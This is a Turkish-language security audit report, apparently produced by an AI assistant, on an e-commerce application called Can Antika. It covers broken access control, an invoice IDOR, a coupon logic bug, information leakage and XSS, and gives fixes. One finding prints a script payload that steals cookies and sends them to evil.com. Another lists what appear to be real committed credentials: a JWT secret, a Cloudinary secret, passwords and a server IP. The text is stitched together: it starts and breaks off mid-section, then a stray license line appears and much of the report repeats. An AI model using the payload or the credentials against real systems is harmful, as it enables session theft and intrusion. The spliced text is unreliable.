    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key:
```


## License: unknown
https://github.com/Aviortheking/games/blob/392a5f75cb70d467a0e001317f6ed236c48123bc/dzeio.next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
